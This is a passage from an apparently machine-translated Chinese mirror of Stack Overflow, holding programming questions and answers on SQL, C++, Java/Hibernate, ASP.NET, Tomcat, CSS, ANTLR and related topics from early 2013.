yyy | 21/12/2012 | f3 | l3 | 2 
```

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T15:18:27.807

尝试这个：

```
SELECT 
  s.SessionId,
  s.Date,
  s.firstname,
  s.lastname,
  m.SessionsCount
FROM Sessions s
INNER JOIN
(
   SELECT SessionID, COUNT(SessionID) AS SessionsCount, MAX(Date) LatestDate
   FROM sessions
   GROUP BY SessionID
) m  ON m.SessionID  = s.SessionID
    AND m.LatestDate = s.Date; 
```

## [SQL 小提琴演示](http://www.sqlfiddle.com/#!2/286fd/2)

这会给你：

```
| SESSIONID |       DATE | FIRSTNAME | LASTNAME | SESSIONSCOUNT |
-----------------------------------------------------------------
|       xxx | 21/12/2012 |        f1 |       l1 |             2 |
|       yyy | 21/12/2012 |        f3 |       l3 |             2 | 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:30:25.190

这将简单地做到，

```
select a.date1,a.first_name,a.last_name
from(select row_number() 
over(partition by SessionId order by SessionId) rnk,date1,first_name,last_name
from table1) a where a.rnk=1 
```

示例答案：

```
DATE1       FIRST_NAME  LAST_NAME
21/12/2012       f1       l1
21/12/2012       f3       l3 
```

[**现场演示**](http://www.sqlfiddle.com/#!3/b1187/7)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T15:40:35.273

尝试这个：

```
SELECT sessionid, a.date, firstname, lastname, COUNT(sessionid) sessioncnt 
FROM (SELECT * FROM sessions ORDER BY sessionid, date DESC) AS a 
GROUP BY sessionid; 
```

# c++ - 切换案例避免循环

> ID：14111588
> 
> 赞同：0
> 
> 时间：2013-01-01T15:16:49.357
> 
> 标签：c++, loops, if-statement, switch-statement

我有以下代码：

```
int send_cmd( int sock, char * buffer, int lbuffer )
{
    int err = 0;

    //do_something part 1

while(1)
    switch(check_status(buffer)){
            case 1:
                return 0;
                 break;
            case 0:
                if (err > 0)
                    break;

                //do_something part 2

                err = 1;
            }
        return -1;
    } 
```

我认为这不是很好的编码，但我不知道如何优化它。

我只想运行一次“第 2 部分代码”，并且只有在“第 1 部分代码”出现错误的情况下。

***你能告诉我如何让它正确运行吗？因为在第 2 部分执行一次后，现在不会返回任何内容。***

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T15:22:35.003

如果您不需要循环，则可以使用`if`and `return`。由于您不使用`err`，因此您也可以省略它。

```
// first command
int status = check_status(buffer);
if (status == 1)
    return 0;

// second command
status = check_status(buffer);
if (status == 1)
    return 0;

return -1; 
```

至少在这种简单的情况下，`switch`并不比 更好或更快`if`。在某些情况下，这是真的，但我不会打赌。通常，优化器足以发出最佳机器代码，无论您使用 switch 还是 if。所以选择简单、可读和可维护的代码。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T15:29:55.173

> 我只想运行一次“第 2 部分代码”，并且只有在“第 1 部分代码”出现错误的情况下。

不需要 while 循环或 switch 语句。

```
// Do something part 1
if (check_status(buffer) == 1) {
   return 0;
}

// Do something part 2
if (check_status(buffer) == 1) {    
   return 0;
}
else {
    return -1;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-01T15:31:23.067

看着你，我认为这是你试图使用`err`变量实现的目标：

```
//Part 1
if ( check_status(buffer) ) return 0; //No error

//Part 2
if ( check_status(buffer) ) return 1; //One error
else return -1;  //Two errors 
```

您不需要任何 while 循环来执行此操作。

# apache-flex - 使用 web.config 在多个站点之间共享文件（例如 swf）

> ID：14111589
> 
> 赞同：2
> 
> 时间：2013-01-01T15:16:48.920
> 
> 标签：apache-flex, iis-7, coldfusion, web-config, flash

我正在管理一个在同一服务器上的多个站点之间共享的 flash/flex 系统。

我不想在每个站点上存储相同 swf 文件的副本，而是想在包含这些 swf 的服务器（windows 2008 iis7）上设置一个文件夹，并允许每个站点使用相同的 swf 文件。我想以某种方式包含这些文件，以便用户认为 swf 文件来自源域而不是共享域。

我习惯于使用冷融合映射来共享文件，但这不适用于非冷融合文件，即 swf

我想知道是否可以将我的 web.config 文件中的 url 重写为这些 swf 文件？

请问有人可以建议一种方法吗？

谢谢大卫

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-01T15:51:35.723

你能在你的网络服务器上做一个“虚拟目录”吗？

IIS： http: [//support.microsoft.com/kb/172138](http://support.microsoft.com/kb/172138)

阿帕奇：[http ://w3shaman.com/article/creating-virtual-directory-apache](http://w3shaman.com/article/creating-virtual-directory-apache)

这很像 CF 映射为 CF 所做的，但这是在 Web 服务器级别上，使映射的资源可以通过 URL 访问。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T15:19:22.187

如果您正在谈论建立自己的 CDN（内容交付网络），那么只需建立另一个网站来提供您所有的图形、脚本、CSS、swfs 等。

# c# - 在我的 ListView 中标记最后一项

> ID：14111593
> 
> 赞同：-1
> 
> 时间：2013-01-01T15:18:20.133
> 
> 标签：c#, winforms

我构建应用程序并将文件添加到我的 ListView，我希望每次添加的最后一个文件都会强调，所以在我添加的 Foreach 语句`lvFiles.Items[lvFiles.Items.Count - 1].Selected = true;`中，但在这种情况下，我的 ListView 中的所有文件都强调，而不仅仅是最后一个

```
List<string> filesList

            foreach (string fileName in filesList)
            {
                FileInfo fileInfo = new FileInfo(fileName);
                if (checkFileCreationDate(fileInfo))
                {
                    if (editcap.isWiresharkFormat(fileInfo.FullName))
                    {
                        if (editcap.isLibpcapFormat(fileInfo.FullName))
                        {
                            addFileToListBox(fileInfo.FullName, capinfos.getFileDuration(fileInfo.FullName));
                        }
                        else if (!editcap.isLibpcapFormat(fileInfo.FullName))
                        {
                            fileToAdd = editcap.getNewFileName(fileInfo.FullName);

                            if (new FileInfo(fileToAdd).Exists && !fileInfo.Exists)
                            {
                                addFileToListBox(fileToAdd, capinfos.getFileDuration(fileInfo.FullName));
                            }
                        }
                    }
                }
            }

private void addFileToListBox(string filePath, string duration)
{
    item = new ListViewItem(new string[] { new FileInfo(filePath).Name, duration, "Waiting" });
    item.Tag = new FileInfo(filePath).FullName;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T15:20:23.537

只需将该语句放在您的 foreach 之后，它应该可以工作。

喜欢：

```
foreach(var x in colY)
{
  //check file
  lvFiles.Items[lvFiles.Items.Count - 1].Selected = false;
  //add item here
  lvFiles.Items[lvFiles.Items.Count - 1].Selected = true;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:21:33.540

您需要首先取消选择以前的元素，然后才选择最后一个：

```
foreach (var item in lvFiles.Items)
{
    item.Selected = false;
}

lvFiles.Items[lvFiles.Items.Count - 1].Selected = true; 
```

# asp.net - 如何捕获 web 方法中抛出的每个异常，但没有这些异常会中断程序的执行

> ID：14111595
> 
> 赞同：1
> 
> 时间：2013-01-01T15:18:46.157
> 
> 标签：asp.net, jquery, exception-handling

有什么办法可以让 webmethod 中抛出的每个异常都直接进入 jQuery Ajax 错误回调函数？

```
 $.ajax({
        type: "POST",
        contentType: "application/json; charset=utf-8",
        url: "MantenimientoNotasCapacidades.aspx/SaveViaWebService",
        data: JSON.stringify(params),
        dataType: "json",
        async: true,
        success: function (data) {               

        },
        error: function (request, status, error) {
            var response = JSON.parse(request.responseText).d;
            var error = JSON.parse(response);
            alert(JSON.parse(request.responseText).error.message);

        }
    }); 
```

我知道使用**JSON.parse(request.responseText).Message**应该足以显示该错误的信息，但我现在所得到的是每次引发异常时代码都会停在那里，有必要继续按下F10 或 F5 终于可以看到警报了。

我已经尝试将我的代码包含在一个“try”块中，但我认为这样做没有多大意义，因为我不能像在我可以使用的 Visual Basic 应用程序中那样在“catch”块中做很多事情'catch' 块以在 MsgBox 中显示异常消息。

有什么方法可以在错误回调函数中捕获 web 方法中抛出的所有异常，但不会停止代码的执行？

任何帮助将非常感激。

PS新年快乐！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-03T17:49:09.363

根据@cmd.promt 的建议，我将 Response.StatusCode 更改为 500 并创建了包含所引发异常的描述的对象（**myError**），然后唯一要做的就是序列化对象并将其发送回客户端（在这里我尝试使用 Response..Write("{""message"": ""action failed!""}") 但由于某种原因，我总是最终得到相同的错误：***“JSON.parse: unexpected non -JSON 数据后的空白字符”***所以最后我决定使用[json.net](http://json.codeplex.com/)并忘记所有关于**response.Write**的内容）

```
<WebMethod()> _
        Public Shared Function SaveViaWebService(lst As List(Of Students)) As String
          Try

          Catch ex As Exception

                Dim httpResponse = HttpContext.Current.Response
                httpResponse.Clear()
                httpResponse.StatusCode = 500

                'I thought that .StatusDescription would be useful but it turned out it didn't
                'httpResponse.StatusDescription = ex.Message

                Dim myError= New With {.message = ex.Message, .source = ex.Source}
                Return JsonConvert.SerializeObject(myError)

            End Try
        End Function 
```

这样，错误就会正确发送到错误回调，我唯一要做的就是玩[萤火虫](http://getfirebug.com/)并查看错误是如何发送的 ![在此处输入图像描述](../Images/b2380df0ca9028ed45237f2afcac38a4.png)

```
$.ajax({
        type: "POST",
        contentType: "application/json; charset=utf-8",
        url: "MantenimientoNotasCapacidades.aspx/SaveViaWebService",
        data: JSON.stringify(params),
        dataType: "json",
        async: true,
        success: function (data) {               

        },
        error: function (request, status, error) {
            var response = JSON.parse(request.responseText).d;
            var error = JSON.parse(response);
            alert(JSON.parse(request.responseText).error.message);

        }
    }); 
```

到目前为止，一切都如我所愿，除了不断中断程序执行的异常。**这是他们的正常行为吗？？他们不是都应该直接去'catch'块吗？**

# java - 加密 JAR，其中源保护是优先事项

> ID：14111603
> 
> 赞同：3
> 
> 时间：2013-01-01T15:20:22.293
> 
> 标签：java, encryption, jar, aes

我有一个难题。基本上，我为一群我是朋友的人提供了一个程序，该程序使用了我不希望组外任何人知道的源代码。我们都知道 Java 在进行任何级别的混淆时都非常糟糕，因为大多数混淆工具只能重命名对象、扰码等。我使用过这样的工具，但老实说，我想尽可能地使用程序的安全性。

由于应用程序需要用户名、密码和其他标识符才能登录到它使用的服务器，我开始怀疑是否可以为用户生成唯一的 AES 密钥来保护 JAR。

基本上，在运行各种启动器登录时，启动器应用程序可能会从服务器请求一个 AES 密钥，并使用它来解密它已经从服务器下载的安全 JAR。密钥对于每个用户来说都是完全唯一的，这意味着服务器必须为每个用户以不同的方式加密 JAR。

现在，我知道这听起来有多疯狂。但由于这是一件低级的事情，我需要知道是否有一种方法可以解密并从任何类型的流中运行 JAR。或者，如果这不可能，解密文件、运行它然后重新加密它是否合理？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-01T17:50:46.830

当然，您可以即时解密和运行 Java 字节码 - 字节码操作库（例如 ASM）甚至可以动态*创建*新类。

但是，老实说，如果某些东西真的在计算机上运行，​​那么任何有相关知识的人都可以使用它的代码。尤其是 Java，它甚至更方便，因为它允许比任何本机编译语言更好地访问由 JVM 加载的类的字节码。

从理论上讲，您*可以*通过使用 JNA/JNI 和一个或两个本机共享库来进一步混淆。但是，在坚定的攻击者手中，没有任何措施可以完全保护您的代码——他们只需要更多时间来弄清楚您的算法是如何工作的。如果您担心盗版，那么我们正处于虚拟化时代；你实际上可以通过几个按键从上到下克隆整个计算机系统——你找出其余的......

唯一可能可行的解决方案是将您的软件作为一种服务提供，同时解决该方法带来的所有问题——您*仍然*没有绝对的安全性。

如果您非常关心保护您的知识产权，那么请一位律师并考虑以某种形式发布您的算法 - 默默无闻只会到此为止。它不会阻止某人对您的系统进行黑盒分析，而且通常只知道某事是*可能*的就足够了。

*请*停止尝试为显然不是技术性质的问题寻找技术解决方案...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-02T06:51:24.940

我的回答是将服务器信息完全保留在 jar 之外。使用参数或配置文件指向获取该信息的位置。那么这个jar文件里面就没有秘密了。只有运行代码的服务器具有该信息。然后，您可以执行一些操作，例如使配置文件只能由可以运行 jar 中代码的用户读取。

# java - @ManyToMany(mappedBy = "foo")

> ID：14111607
> 
> 赞同：38
> 
> 时间：2013-01-01T15:20:37.440
> 
> 标签：java, jpa, orm, many-to-many

富有：

```
@ManyToMany(mappedBy = "foos")
private Set<Bar> bars 
```

和酒吧有：

```
@ManyToMany
private Set<Foo> foos 
```

mappedBy 属性的位置对双向关系有什么区别，除了 table 是称为 foo_bar 还是 bar_foo ；如果没有 mappedBy 属性，我会得到两个连接表，即 foo_bar 和 bar_foo。

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2013-01-01T15:26:35.610

[文档](http://docs.jboss.org/hibernate/core/3.6/reference/en-US/html_single/#collections-bidirectional)说：

> 如果关联是双向的，则一侧必须是所有者，一侧必须是反向端（即更新关联表中的关系值时将被忽略）：

因此，具有`mappedBy`属性的一面是反面。没有`mappedBy`属性的一方是所有者。

所有者方是 Hibernate 为知道存在哪个关联而查看的一方。因此，例如，如果您在 Bar 的 foo 集合中添加一个 Foo，Hibernate 将在连接表中插入一个新行。相反，如果您将 Bar 添加到 Foo 的 bar 集合中，则不会在数据库中修改任何内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T15:28:29.950

`mappedBy`告诉 Hibernate 关系的哪一方“拥有”链接。在`OneToMany`or`OneToOne`中， using`mappyedBy`告诉 Hibernate 在另一个表中将有一个外键用于存储链接。

说到`ManyToMany`，有一个连接表，所以两者都没有直接链接到另一个对象。但是，hibernate 仍然需要知道哪个是“拥有”方，知道如何级联操作。

# c++ - 在 OpenGL 中清除场景和刷新变量

> ID：14111613
> 
> 赞同：1
> 
> 时间：2013-01-01T15:21:32.210
> 
> 标签：c++, opengl, menu, glut, flush

我在 中制作了一个游戏`OpenGL`，并且还添加了一个菜单项。当我右键单击`OpenGL`屏幕时，会显示菜单项，并且我在`Reset Game`其中添加了一个选项“”。我怎样才能通过点击这个来清除游戏中涉及的所有变量（任何清除或刷新功能？）。

这是我的代码

```
glutCreateMenu(menu);
glutAddMenuEntry("Reset Game", 1);

void menu(int item)
{
    switch (item)
    {
    case 1:
        {
            //Adding a function here to clear all the variables    
        }    
        break;
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T15:45:20.707

您只需要编写例程即可将所有变量重置为其默认值。

```
void Reset()
{
    score = 0;
    lives = 3;
    // etc.
} 
```

OpenGL 不知道这些是什么，所以你必须自己做。

# java - Hibernate实体中的复合主键

> ID：14111624
> 
> 赞同：-1
> 
> 时间：2013-01-01T15:22:37.010
> 
> 标签：java, hibernate

假设我需要创建一个表（实体），其中 id 和 name 作为主键（复合主键）。我如何使用注释创建具有休眠功能的实体以支持它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:31:02.823

看看这个关于 Hibernate 中复合主键的教程：

[http://www.ibm.com/developerworks/library/os-hibernatejpa/](http://www.ibm.com/developerworks/library/os-hibernatejpa/)

# android - 带有图片的水平可滚动文本视图字幕android

> ID：14111625
> 
> 赞同：1
> 
> 时间：2013-01-01T15:22:43.083
> 
> 标签：android, marquee

我是安卓新手

我能够制作仅包含文本的可滚动字幕文本视图

但问题是如何在每个文本旁边插入图片并使其与文本一起滚动

`text1 pic text2 pic text3 pic text4 pic text5 pic text5 pic text6 pic text7 pic`

我可以使用相同的图片，无需使用不同的图片

# java - 以下Tomcat错误的原因是什么：

> ID：14111629
> 
> 赞同：2
> 
> 时间：2013-01-01T15:23:47.217
> 
> 标签：java, tomcat

我正在为 solr 应用程序运行 Tomcat 服务器。我重新启动服务器并在我的 catalina.out 中观察到以下错误。

```
Exception configuring digester to permit java encoding names in XML files. Only IANA encoding names will be supported. 
```

这个错误是什么意思，如何解决？我根本不知道 Java，所以任何帮助将不胜感激。这是 CentO 上的 Tomcat6。

编辑的日志文件：

```
Jan 1, 2013 10:14:44 a.m. org.apache.catalina.users.MemoryUserDatabase open
WARNING: Exception configuring digester to permit java encoding names in XML files. Only IANA encoding names will be supported.
 org.xml.sax.SAXNotSupportedException: http://apache.org/xml/features/allow-java-encodings
  at gnu.xml.stream.SAXParserFactory.setFeature(libgcj.so.10)
 at org.apache.tomcat.util.digester.Digester.setFeature(Digester.java:556)
  at org.apache.catalina.users.MemoryUserDatabase.open(MemoryUserDatabase.java:391)
  ............

  Jan 1, 2013 10:14:44 a.m. org.apache.catalina.core.StandardService start
   INFO: Starting service Catalina
    Jan 1, 2013 10:14:44 a.m. org.apache.catalina.core.StandardEngine start
   INFO: Starting Servlet Engine: Apache Tomcat/6.0.24
  Jan 1, 2013 10:14:44 a.m. org.apache.catalina.startup.HostConfig deployDescriptor
   INFO: Deploying configuration descriptor manager.xml
   Jan 1, 2013 10:14:45 a.m. org.apache.catalina.startup.TldConfig lifecycleEvent
   SEVERE: Error processing TLD files for context path /manager
    java.lang.IllegalArgumentException: URI "file:./" is not hierarchical
     at java.io.File.<init>(libgcj.so.10)
  at org.apache.catalina.startup.TldConfig.getJarPaths(TldConfig.java:687)
  at org.apache.catalina.startup.TldConfig.execute(TldConfig.java:281)

   ...........

    Jan 1, 2013 10:14:45 a.m. org.apache.catalina.startup.HostConfig deployDescriptor
    INFO: Deploying configuration descriptor solr.xml
    Jan 1, 2013 10:14:45 a.m. org.apache.catalina.startup.TldConfig lifecycleEvent
    SEVERE: Error processing TLD files for context path /solr
    java.lang.IllegalArgumentException: URI "file:./" is not hierarchical
    at java.io.File.<init>(libgcj.so.10)
    at org.apache.catalina.startup.TldConfig.getJarPaths(TldConfig.java:687)
    at org.apache.catalina.startup.TldConfig.execute(TldConfig.java:281)
   at org.apache.catalina.startup.TldConfig.lifecycleEvent(TldConfig.java:739)
   at 
    .........
   Jan 1, 2013 10:14:45 a.m. org.apache.solr.core.SolrResourceLoader locateSolrHome
   INFO: Using JNDI solr.home: /var/lib/tomcat6/my/solr/
    Jan 1, 2013 10:14:45 a.m. org.apache.solr.core.SolrResourceLoader <init>
    INFO: new SolrResourceLoader for deduced Solr Home: '/var/lib/tomcat6/my/solr/'
  Jan 1, 2013 10:14:45 a.m. org.apache.solr.servlet.SolrDispatchFilter init
   INFO: SolrDispatchFilter.init()
  Jan 1, 2013 10:14:45 a.m. org.apache.solr.core.SolrResourceLoader locateSolrHome
  INFO: Using JNDI solr.home: /var/lib/tomcat6/my/solr/
    Jan 1, 2013 10:14:45 a.m. org.apache.solr.core.CoreContainer$Initializer initialize
   INFO: looking for solr.xml: /var/lib/tomcat6/my/solr/solr.xml
    Jan 1, 2013 10:14:45 a.m. org.apache.solr.core.CoreContainer load
   INFO: Loading CoreContainer using Solr Home: '/var/lib/tomcat6/my/solr/'
    Jan 1, 2013 10:14:45 a.m. org.apache.solr.core.SolrResourceLoader <init>
   INFO: new SolrResourceLoader for directory: '/var/lib/tomcat6/my/solr/'
   Jan 1, 2013 10:14:45 a.m. org.apache.solr.core.CoreContainer create
  INFO: Creating SolrCore '' using instanceDir: /var/lib/tomcat6/my/solr/. 
  Jan 1, 2013 10:14:45 a.m. org.apache.solr.core.SolrResourceLoader <init>
   INFO: new SolrResourceLoader for directory: '/var/lib/tomcat6/my/solr/./'
    Jan 1, 2013 10:14:45 a.m. org.apache.solr.core.SolrConfig initLibs
     INFO: Adding specified lib dirs to ClassLoader
    Jan 1, 2013 10:14:45 a.m. org.apache.solr.common.SolrException log
  SEVERE: Error in xpath:javax.xml.xpath.XPathExpressionException: multiple nodes in  node-set 
```

我将它用于 solr

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2014-08-29T18:34:36.683

试试看这里：

[http://www.coderanch.com/t/614743/Tomcat/Tomcat-CentOS-VM](http://www.coderanch.com/t/614743/Tomcat/Tomcat-CentOS-VM)

我的问题是 catalina.sh 脚本找到的 Java 安装不好。不知道为什么，因为我没有调查。

这是一个centos 6 tomcat6 RPM 安装。修复方法是安装 Oracle JDK 并更改 /etc/tomcat6/tomcat6.conf 以使用新安装的 Oracle JDK。

# decoding - 将缓冲区分配给音频解码器组件后的 OMX_ErrorUnsupportedSetting 错误事件

> ID：14111630
> 
> 赞同：2
> 
> 时间：2013-01-01T15:23:53.527
> 
> 标签：decoding, raspberry-pi, openmax

在将缓冲区提供给 Raspberry Pi 上的音频解码器组件后，我收到 OMX_ErrorUnsupportedSetting 错误事件。我尝试了任何想到的方法来更改参数，但回调仍然到达。OpenMAX 标准中是否有任何方法可以尝试调查导致该事件的参数？

这就是我正在做的事情：

1.  创建组件；
2.  禁用所有端口；
3.  将状态设置为空闲；
4.  设置端口格式以使用 OMX_AUDIO_CodingAAC；
5.  将端口定义设置为使用 OMX_AUDIO_CodingAAC，每个 6144 字节的 4 个缓冲区；
6.  将配置文件设置为这些值（不确定是否需要）：profileType.nSampleRate = 48000; profileType.nFrameLength = 0; profileType.nChannels = 6; profileType.nBitRate = 288000; profileType.nAudioBandWidth = 0; 将带有 bCodecConfigIsComplete 的 OMX_PARAM_CODECCONFIGTYPE 设置为 1；
7.  将 OMX_IndexParamBrcmDecoderPassThrough 设置为 true。

将所有缓冲区发送到组件后，我突然收到 OMX_ErrorUnsupportedSetting 事件并且端口未启用。知道我可能做错了什么或如何检查导致错误的参数吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-24T18:06:34.087

制造商告诉我，发生这种情况的原因是目前除了 PCM 之外没有可用的音频解码器。

# mysql - 从 MySQL 中的时间戳获取日期名称

> ID：14111633
> 
> 赞同：4
> 
> 时间：2013-01-01T15:24:11.773
> 
> 标签：mysql, datetime, select, timestamp

如何从 MySQL 中的时间戳数据类型获取日期名称？

`2013-01-01 15:00:28`应该返回`Tuesday`

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2013-01-01T15:25:56.833

```
SELECT DAYNAME('2013-01-01 10:10:10'); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2015-04-17T02:50:47.817

短日名称示例。这将返回“星期二”：

```
SELECT DATE_FORMAT('2013-01-01 15:00:28','%a') as dayname; 
```

长天名称示例。这将返回“星期二”：

```
SELECT DAYNAME('2013-01-01 15:00:28') as dayname; 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-01-01T15:43:34.737

或者只是用您使用的任何语言对其进行格式化。

可以说... PHP：

```
<?php

$date = '2013-01-01 15:00:28';
$datetime = new DateTime($date);
$formated_date = $datetime->format('l'); // Tuesday 
```

让我们说 JavaScript：

```
var original_date = '2013-01-01 15:00:28';
var day_names = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"]
var date_object = new Date(x);
var formated_date = day_names[date_object.getDay()];
// alert or print formated_date 
```

# css - CSS Float Left 和 Clearfix 不能一起工作

> ID：14111634
> 
> 赞同：2
> 
> 时间：2013-01-01T15:24:13.037
> 
> 标签：css, image, clearfix

我有一个由 PHP 动态控制的简单图片库，用于在页面中添加和删除图片缩略图。我遇到的问题是我希望图像彼此相邻对齐，直到该行没有空间并被迫开始另一个。

我已经尝试使用`float:left`which 工作但包含高度设置为自动调整自身大小以不包含图像的包含主体 div。然后我尝试添加`clear:both;`修复了body div问题的图像，但现在图像直接位于彼此下方。

我`float:left`以前在很多情况下都使用过，但包含的 div 具有固定的高度。

有谁知道我该如何解决这个问题？

谢谢大家:)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-01T15:27:17.803

您必须使用“clear: both;”添加一个空 div 作为包含图像的 div 中的最后一个元素。

如果添加“clear: both;” 对于图像，该图像将被放置在新行上，因为它不允许浮动元素位于其两侧。

# game-physics - 检查对象是否被障碍物隐藏

> ID：14111640
> 
> 赞同：0
> 
> 时间：2013-01-01T15:24:35.983
> 
> 标签：game-physics, fieldofview

我正在进行模拟，目前正在为其添加障碍。现在设置障碍的目的是让其他特工可以躲在他们身后，而其他人看不到它们。但是我试图找出检查是否最好的方法视野中的代理位于障碍物后面，因此无法看到。这是一个示例：

![在此处输入图像描述](../Images/a0ac4810fe4ad8606ad50a3c41b228b9.png)

黑色的代理不应该看到红色的代理，但应该能够看到黄色的代理。（绿线表示黑色代理的视野）

目前，我的视野仅计算代理所处的角度并检查该角度是否在视野内。我正在查看游戏开发人员使用的一些解决方案，并且正在阅读有关光线投射的内容，但它似乎计算量很大，对我来说不是一个好的解决方案，因为我将有数百个代理投射光线。

我在想的另一件事是检查障碍物占据的角度（例如从 90 到 120 度），如果代理处于相同的角度范围内，则意味着他被障碍物挡住了。（如果有道理的话） .

我在这里发帖是为了询问是否有人可以指导我找到一个简单而有效的解决方案，因为我对这种与游戏开发相关的事情非常陌生。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T21:20:45.060

如果是 2d，则创建两条线（以蓝色显示）并测试线和代理之间的距离。蓝线到代理的距离必须至少为代理半径，否则代理可见。还要给每条蓝线一个垂直的“法线”矢量，你可以用点来确定它在线条的哪一侧。如果它是 3d，您也可以这样做，但使用平面而不是线，您将需要 4 个或 mor 平面而不是 2 个。本质上，这就是截锥体剔除的方式。

![在此处输入图像描述](../Images/c65c4967f7ed76693eb340fbb10a19ba.png)

# javascript - antlr3 的 javascript 目标的状态是什么

> ID：14111643
> 
> 赞同：3
> 
> 时间：2013-01-01T15:25:00.603
> 
> 标签：javascript, antlr

antlr3 中 Javascript 目标的当前状态是什么？我试图为一个简单的语法生成一个解析器，但是生成的代码包含很多编译器错误。检查网站后，我检查了当前的 antlr3.5-snapshot 代码并使用 maven 从源代码构建了 antlr。结果还是一样？有没有我可以使用的特殊版本？还是目标被破坏了？（我发现关于目标在 3.1、3.2 中被破坏的评论，在 3.3 中工作，而对 3.4 和 3.5 没有任何评论） Hier 是 Javascript 代码不起作用的示例：

```
// public class variables
var = ,
    = ,
    = ,
...
    = ,
    = ; 
```

在生成的词法分析器和解析器文件中有更多此类代码。

非常感谢任何提示。

这是我用来尝试 javascript 代码生成的非常简单的测试语法。几乎所有东西都是由 antlrworks 生成的。我添加了目标语言和 prog 规则。（请不要花太多时间编辑此语法以使其正常工作。Antlrworks 检查了语法并且 Java 代码生成工作。所以 - 从用户的角度来看 - Javascript 代码生成应该在不更改语法的情况下工作。）再次感谢您的帮助。

```
grammar TestgrammarV001;

options {
language=JavaScript;
}

prog    :    ID | INT;

ID  :   ('a'..'z'|'A'..'Z'|'_') ('a'..'z'|'A'..'Z'|'0'..'9'|'_')*
    ;

INT :   '0'..'9'+
    ;

FLOAT
    :   ('0'..'9')+ '.' ('0'..'9')* EXPONENT?
    |   '.' ('0'..'9')+ EXPONENT?
    |   ('0'..'9')+ EXPONENT
    ;

COMMENT
    :   '//' ~('\n'|'\r')* '\r'? '\n' {$channel=HIDDEN;}
    |   '/*' ( options {greedy=false;} : . )* '*/' {$channel=HIDDEN;}
    ;

WS  :   ( ' '
        | '\t'
        | '\r'
        | '\n'
        ) {$channel=HIDDEN;}
    ;

STRING
    :  '"' ( ESC_SEQ | ~('\\'|'"') )* '"'
    ;

CHAR:  '\'' ( ESC_SEQ | ~('\''|'\\') ) '\''
    ;

fragment
EXPONENT : ('e'|'E') ('+'|'-')? ('0'..'9')+ ;

fragment
HEX_DIGIT : ('0'..'9'|'a'..'f'|'A'..'F') ;

fragment
ESC_SEQ
    :   '\\' ('b'|'t'|'n'|'f'|'r'|'\"'|'\''|'\\')
    |   UNICODE_ESC
    |   OCTAL_ESC
    ;

fragment
OCTAL_ESC
    :   '\\' ('0'..'3') ('0'..'7') ('0'..'7')
    |   '\\' ('0'..'7') ('0'..'7')
    |   '\\' ('0'..'7')
    ;

fragment
UNICODE_ESC
    :   '\\' 'u' HEX_DIGIT HEX_DIGIT HEX_DIGIT HEX_DIGIT
    ; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-04-23T18:56:18.937

大约一年半前，我发布了一个类似的问题（这是帖子：[antlr 3.4 或 3.5 中的 Javascript 状态](https://stackoverflow.com/questions/19841084/status-of-javascript-in-antlr-3-4-or-3-5/19844367?noredirect=1#comment30319387_19844367)）。

JavaScript 目标适用于 ANTLR v3.3，但不适用于 3.4 或 3.5。

# c++ - C++中没有关键字的语句块

> ID：14111644
> 
> 赞同：2
> 
> 时间：2013-01-01T15:25:19.883
> 
> 标签：c++

> **可能重复：**
> [C++ 中带括号的范围](https://stackoverflow.com/questions/5072845/scope-with-brackets-in-c)

我正在处理 v8 javascript 引擎，为我大学的新生开发学习环境，我加强了这一点：

d8.cc:309

```
char* input = NULL;
{  // Release lock for blocking input.
  Unlocker unlock(isolate);
  input = fgets(buffer, kBufferSize, stdin);
} 
```

1.  它叫什么名字？
2.  我如何在其他情况下使用它？
3.  只有在 c++ 中才公平吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-01T15:30:28.340

就语言标准而言，整体结构（即未命名的块）称为*复合语句。*它用于引入一个新的范围。

在 C++ 中，这通常有两种用途：

1.  将局部变量限制为特定的代码部分；目的是尽量减少范围“污染”，并使代码读者更容易。（同样可以在其他语言中实现，例如 C 和 Java。）

2.  严格控制对象/资源的生命周期，因为作用域局部变量的析构函数将在作用域结束时自动调用。这可以用于一些巧妙的事情，例如自动关闭文件句柄、释放互斥锁等等。因此，您可能会听到人们谈论例如*作用域互斥锁*。（C 和 Java 没有析构函数，所以这个概念不能翻译。）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-01T15:31:48.577

它没有名字，它是一个代码块。大括号为 Unlocker 控制的锁设置了明确的生命周期。

这是 C 和 C++ 中完全有效的技术。在 C++ 中更有可能看到它，其中 RAII 用于限制对象的生命周期并提供及时的资源释放（例如锁），尽管在 C 中使变量的生命周期清晰可见是非常有用的读者。

# google-maps - 如何通过 Google 地图 API 获取一个国家/地区的州列表？

> ID：14111656
> 
> 赞同：2
> 
> 时间：2013-01-01T15:27:10.330
> 
> 标签：google-maps, google-maps-api-3, google-geocoder, google-geocoding-api

有没有可能。我花了 5 个小时研究并没有找到解决方案。

有人知道吗？

* * *

## 回答 #1

> 赞同：4
> 
